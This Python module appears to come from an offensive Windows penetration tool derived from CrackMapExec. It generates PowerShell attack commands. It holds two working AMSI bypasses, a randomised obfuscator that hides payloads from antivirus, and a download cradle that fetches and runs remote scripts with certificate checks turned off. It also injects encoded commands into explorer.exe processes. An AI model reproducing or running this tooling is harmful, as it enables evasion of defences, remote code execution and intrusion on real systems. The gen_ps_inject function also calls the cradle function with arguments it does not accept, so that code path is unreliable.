# These are the people that did the hard work of figuring this out:
# https://github.com/awsmhacks/CrackMapExtreme/blob/master/cmx/helpers/powershell.py
# https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/helpers/powershell.py

import re
from base64 import b64encode
from string import ascii_lowercase
from random import choice, sample,choices

############################
# PS Code Execution on Host
############################
def create_ps_command(ps_command, logger, force_ps32=False, no_obfs=False, server_os='Windows'):
    logger.debug('Generating PowerShell command')

    amsi_bypass = create_amsi_bypass(server_os)

    if force_ps32:
        command = amsi_bypass + """
$functions = {{
    function Command-ToExecute
    {{
{command}
    }}
}}
if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
{{
    $job = Start-Job -InitializationScript $functions -ScriptBlock {{Command-ToExecute}} -RunAs32
    $job | Wait-Job
}}
else
{{
    IEX "$functions"
    Command-ToExecute
}}
""".format(command=amsi_bypass + ps_command)

    else:
        command = amsi_bypass + ps_command

    if no_obfs:
        command = 'powershell.exe -noni -nop -w 1 -enc {}'.format(encode_ps_command(command).decode("utf-8"))
    else:
        obfs_attempts = 0
        while True:
            command = 'powershell.exe -exec bypass -noni -nop -w 1 -C "{}"'.format(invoke_obfuscation(command))
            if len(command) <= 8191:
                break

            if obfs_attempts == 4:
                logger.fail('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
                raise Exception('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
            obfs_attempts += 1

    if len(command) > 8191:
        logger.fail('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
        raise Exception('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
    return command

def create_amsi_bypass(server_os):
    # Stolen From: https://github.com/awsmhacks/CrackMapExtreme/blob/master/cmx/helpers/powershell.py
    """AMSI bypasses are an ever-changing p.i.t.a

        The default bypass is from amonsec and released around july/2019
        and works on server2016/win10 1804+

        The default wont work on older window systems though, so we revert
        back to ol' faithful if the os is win7 or 2012.
    """

    # bypass from amonsec. tweaked and made reliable by the homie @nixbyte
    # https://gist.githubusercontent.com/amonsec/986db36000d82b39c73218facc557628/raw/6b8587154ac478091388bc56d9a04283953800b8/AMSI-Bypass.ps1
    if "2012" in server_os or "7601" in server_os:
        amsi_bypass = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
try{
[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)
}catch{}"""
    else:
        amsi_bypass = """$kk='using System;using System.Runtime.InteropServices;public class kk {[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule,string lpProcName);[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string lpLibFileName);[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSize,uint flNewProtect,out uint lpflOldProtect);}';Add-Type $kk;$oldProtectionBuffer=0;[IntPtr]$address=[IntPtr]::Add([kk]::GetProcAddress([kk]::LoadLibrary("amsi.dll"),"DllCanUnloadNow"),2000);[kk]::VirtualProtect($address, [uint32]2, 4, [ref]$oldProtectionBuffer)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([byte[]] (0x31,0xC0,0xC3),0,$address,3);[kk]::VirtualProtect($address,[uint32]2,$oldProtectionBuffer,[ref]$oldProtectionBuffer)|Out-Null;"""
    return amsi_bypass

############################
# PS Obfuscation Techniques
############################
def encode_ps_command(command):
    return b64encode(command.encode('UTF-16LE'))


def invoke_obfuscation(scriptString):
    """
    Taken from the GreatSCT project
    https://raw.githubusercontent.com/GreatSCT/GreatSCT/master/Tools/Bypass/bypass_common/invoke_obfuscation.py
    """

    # Add letters a-z with random case to $RandomDelimiters.
    alphabet = ''.join(choice([i.upper(), i]) for i in ascii_lowercase)

    # Create list of random dxelimiters called randomDelimiters.
    # Avoid using . * ' " [ ] ( ) etc. as delimiters as these will cause problems in the -Split command syntax.
    randomDelimiters = ['_','-',',','{','}','~','!','@','%','&','<','>',';',':']

    for i in alphabet:
        randomDelimiters.append(i)

    # Only use a subset of current delimiters to randomize what you see in every iteration of this script's output.
    randomDelimiters = choices(randomDelimiters, k=int(len(randomDelimiters)/4))

    # Convert $ScriptString to delimited ASCII values in [Char] array separated by random delimiter from defined list $RandomDelimiters.
    delimitedEncodedArray = ''
    for char in scriptString:
        delimitedEncodedArray += str(ord(char)) + choice(randomDelimiters)

    # Remove trailing delimiter from $DelimitedEncodedArray.
    delimitedEncodedArray = delimitedEncodedArray[:-1]
    # Create printable version of $RandomDelimiters in random order to be used by final command.
    test = sample(randomDelimiters, len(randomDelimiters))
    randomDelimitersToPrint = ''.join(i for i in test)

    # Generate random case versions for necessary operations.
    forEachObject = choice(['ForEach','ForEach-Object','%'])
    strJoin = ''.join(choice([i.upper(), i.lower()]) for i in '[String]::Join')
    strStr = ''.join(choice([i.upper(), i.lower()]) for i in '[String]')
    join = ''.join(choice([i.upper(), i.lower()]) for i in '-Join')
    charStr = ''.join(choice([i.upper(), i.lower()]) for i in 'Char')
    integer = ''.join(choice([i.upper(), i.lower()]) for i in 'Int')
    forEachObject = ''.join(choice([i.upper(), i.lower()]) for i in forEachObject)

    # Create printable version of $RandomDelimiters in random order to be used by final command specifically for -Split syntax.
    randomDelimitersToPrintForDashSplit = ''

    for delim in randomDelimiters:
        # Random case 'split' string.
        split = ''.join(choice([i.upper(), i.lower()]) for i in 'Split')

        randomDelimitersToPrintForDashSplit += '-' + split + choice(['', ' ']) + '\'' + delim + '\'' + choice(['', ' '])

    randomDelimitersToPrintForDashSplit = randomDelimitersToPrintForDashSplit.strip('\t\n\r')
    # Randomly select between various conversion syntax options.
    randomConversionSyntax = []
    randomConversionSyntax.append('[' + charStr + ']' + choice(['', ' ']) + '[' + integer + ']' + choice(['', ' ']) + '$_')
    randomConversionSyntax.append('[' + integer + ']' + choice(['', ' ']) + '$_' + choice(['', ' ']) + choice(['-as', '-As', '-aS', '-AS']) + choice(['', ' ']) + '[' + charStr + ']')
    randomConversionSyntax = choice(randomConversionSyntax)

    # Create array syntax for encoded scriptString as alternative to .Split/-Split syntax.
    encodedArray = ''
    for char in scriptString:
        encodedArray += str(ord(char)) + choice(['', ' ']) + ',' + choice(['', ' '])

    # Remove trailing comma from encodedArray
    encodedArray = '(' + choice(['', ' ']) + encodedArray.rstrip().rstrip(',') + ')'

    # Generate random syntax to create/set OFS variable ($OFS is the Output Field Separator automatic variable).
    # Using Set-Item and Set-Variable/SV/SET syntax. Not using New-Item in case OFS variable already exists.
    # If the OFS variable did exists then we could use even more syntax: $varname, Set-Variable/SV, Set-Item/SET, Get-Variable/GV/Variable, Get-ChildItem/GCI/ChildItem/Dir/Ls
    # For more info: https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.core/about/about_automatic_variables
    setOfsVarSyntax = []
    setOfsVarSyntax.append('Set-Item' + choice([' '*1, ' '*2]) + "'Variable:OFS'" + choice([' '*1, ' '*2]) + "''")
    setOfsVarSyntax.append(choice(['Set-Variable', 'SV', 'SET']) + choice([' '*1, ' '*2]) + "'OFS'" + choice([' '*1, ' '*2]) + "''")
    setOfsVar = choice(setOfsVarSyntax)

    setOfsVarBackSyntax = []
    setOfsVarBackSyntax.append('Set-Item' + choice([' '*1, ' '*2]) + "'Variable:OFS'" + choice([' '*1, ' '*2]) + "' '")
    setOfsVarBackSyntax.append('Set-Item' + choice([' '*1, ' '*2]) + "'Variable:OFS'" + choice([' '*1, ' '*2]) + "' '")
    setOfsVarBack = choice(setOfsVarBackSyntax)

    # Randomize case of $SetOfsVar and $SetOfsVarBack.
    setOfsVar = ''.join(choice([i.upper(), i.lower()]) for i in setOfsVar)
    setOfsVarBack = ''.join(choice([i.upper(), i.lower()]) for i in setOfsVarBack)

    # Generate the code that will decrypt and execute the payload and randomly select one.
    baseScriptArray = []
    baseScriptArray.append('[' + charStr + '[]' + ']' + choice(['', ' ']) + encodedArray)
    baseScriptArray.append('(' + choice(['', ' ']) + "'" + delimitedEncodedArray + "'." + split + "(" + choice(['', ' ']) + "'" + randomDelimitersToPrint + "'" + choice(['', ' ']) + ')' + choice(['', ' ']) + '|' + choice(['', ' ']) + forEachObject + choice(['', ' ']) + '{' + choice(['', ' ']) + '(' + choice(['', ' ']) + randomConversionSyntax + ')' + choice(['', ' ']) + '}' + choice(['', ' ']) + ')')
    baseScriptArray.append('(' + choice(['', ' ']) + "'" + delimitedEncodedArray + "'" + choice(['', ' ']) + randomDelimitersToPrintForDashSplit + choice(['', ' ']) + '|' + choice(['', ' ']) + forEachObject + choice(['', ' ']) + '{' + choice(['', ' ']) + '(' + choice(['', ' ']) + randomConversionSyntax + ')' + choice(['', ' ']) + '}' + choice(['', ' ']) + ')')
    baseScriptArray.append('(' + choice(['', ' ']) + encodedArray + choice(['', ' ']) + '|' + choice(['', ' ']) + forEachObject + choice(['', ' ']) + '{' + choice(['', ' ']) + '(' + choice(['', ' ']) + randomConversionSyntax + ')' + choice(['', ' ']) + '}' + choice(['', ' ']) + ')')
    # Generate random JOIN syntax for all above options
    newScriptArray = []
    newScriptArray.append(choice(baseScriptArray) + choice(['', ' ']) + join + choice(['', ' ']) + "''")
    newScriptArray.append(join + choice(['', ' ']) + choice(baseScriptArray))
    newScriptArray.append(strJoin + '(' + choice(['', ' ']) + "''" + choice(['', ' ']) + ',' + choice(['', ' ']) + choice(baseScriptArray) + choice(['', ' ']) + ')')
    newScriptArray.append('"' + choice(['', ' ']) + '$(' + choice(['', ' ']) + setOfsVar + choice(['', ' ']) + ')' + choice(['', ' ']) + '"' + choice(['', ' ']) + '+' + choice(['', ' ']) + strStr + choice(baseScriptArray) + choice(['', ' ']) + '+' + '"' + choice(['', ' ']) + '$(' + choice(['', ' ']) + setOfsVarBack + choice(['', ' ']) + ')' + choice(['', ' ']) + '"')

    # Randomly select one of the above commands.
    newScript = choice(newScriptArray)

    # Generate random invoke operation syntax.
    # Below code block is a copy from Out-ObfuscatedStringCommand.ps1. It is copied into this encoding function so that this will remain a standalone script without dependencies.
    invokeExpressionSyntax  = []
    invokeExpressionSyntax.append(choice(['IEX', 'Invoke-Expression']))
    # Added below slightly-randomized obfuscated ways to form the string 'iex' and then invoke it with . or &.
    # Though far from fully built out, these are included to highlight how IEX/Invoke-Expression is a great indicator but not a silver bullet.
    # These methods draw on common environment variable values and PowerShell Automatic Variable values/methods/members/properties/etc.
    invocationOperator = choice(['.','&']) + choice(['', ' '])
    invokeExpressionSyntax.append(invocationOperator + "( $ShellId[1]+$ShellId[13]+'x')")
    invokeExpressionSyntax.append(invocationOperator + "( $PSHome[" + choice(['4', '21']) + "]+$PSHOME[" + choice(['30', '34']) + "]+'x')")
    invokeExpressionSyntax.append(invocationOperator + "( $env:Public[13]+$env:Public[5]+'x')")
    invokeExpressionSyntax.append(invocationOperator + "( $env:ComSpec[4," + choice(['15', '24', '26']) + ",25]-Join'')")
    invokeExpressionSyntax.append(invocationOperator + "((" + choice(['Get-Variable','GV','Variable']) + " '*mdr*').Name[3,11,2]-Join'')")
    invokeExpressionSyntax.append(invocationOperator + "( " + choice(['$VerbosePreference.ToString()','([String]$VerbosePreference)']) + "[1,3]+'x'-Join'')")

    # Randomly choose from above invoke operation syntaxes.
    invokeExpression = choice(invokeExpressionSyntax)

     # Randomize the case of selected invoke operation.
    invokeExpression = ''.join(choice([i.upper(), i.lower()]) for i in invokeExpression)

    # Choose random Invoke-Expression/IEX syntax and ordering: IEX ($ScriptString) or ($ScriptString | IEX)
    invokeOptions = []
    invokeOptions.append(choice(['', ' ']) + invokeExpression + choice(['', ' ']) + '(' + choice(['', ' ']) + newScript + choice(['', ' ']) + ')' + choice(['', ' ']))
    invokeOptions.append(choice(['', ' ']) + newScript + choice(['', ' ']) + '|' + choice(['', ' ']) + invokeExpression)

    obfuscatedPayload = choice(invokeOptions)

    return obfuscatedPayload


############################
# Script Execution
############################
def clean_ps_script(script_path):
    with open(script_path, 'r') as script:
        # strip block comments
        strippedCode = re.sub(re.compile('<#.*?#>', re.DOTALL), '', script.read())
        # strip blank lines, lines starting with #, and verbose/debug statements
        strippedCode = "\n".join([line for line in strippedCode.split('\n') if
                    ((line.strip() != '') and (not line.strip().startswith("#")) and
                    (not line.strip().lower().startswith("write-verbose ")) and
                    (not line.strip().lower().startswith("write-debug ")))])
    return strippedCode

def gen_ps_iex_cradle(script, command=str('')):
    #Generate a powershell download cradle

    # Windows 2008 R2 / Windows 7 = Ssl3,Tls   - tls1.1,1.2 disabled by default
    # no longer need to check os since we always using tls1 on the httpserver now.
    launcher =  "[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}\n"
    launcher += "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls'\n"
    launcher += "IEX (New-Object Net.WebClient).DownloadString('{}');\n".format(script)
    launcher += command
    return launcher.strip()


############################
# Module Execution
############################
def gen_ps_inject(command, context=None, procname='explorer.exe', inject_once=False):
    # The following code gives us some control over where and how Invoke-PSInject does its thang
    # It prioritizes injecting into a process of the active console session

    ps_code = '''
$injected = $False
$inject_once = {inject_once}
$command = "{command}"
$owners = @{{}}
$console_login = gwmi win32_computersystem | select -exp Username
gwmi win32_process | where {{$_.Name.ToLower() -eq '{procname}'.ToLower()}} | % {{
    if ($_.getowner().domain -and $_.getowner().user){{
    $owners[$_.getowner().domain + "\\" + $_.getowner().user] = $_.handle
    }}
}}
try {{
    if ($owners.ContainsKey($console_login)){{
        Invoke-PSInject -ProcId $owners.Get_Item($console_login) -PoshCode $command
        $injected = $True
        $owners.Remove($console_login)
    }}
}}
catch {{}}
if (($injected -eq $False) -or ($inject_once -eq $False)){{
    foreach ($owner in $owners.Values) {{
        try {{
            Invoke-PSInject -ProcId $owner -PoshCode $command
        }}
        catch {{}}
    }}
}}
'''.format(inject_once='$True' if inject_once else '$False',
           command=encode_ps_command(command), procname=procname)

    if context:
        return gen_ps_iex_cradle(context, 'Invoke-PSInject.ps1', ps_code, post_back=False)

    return ps_code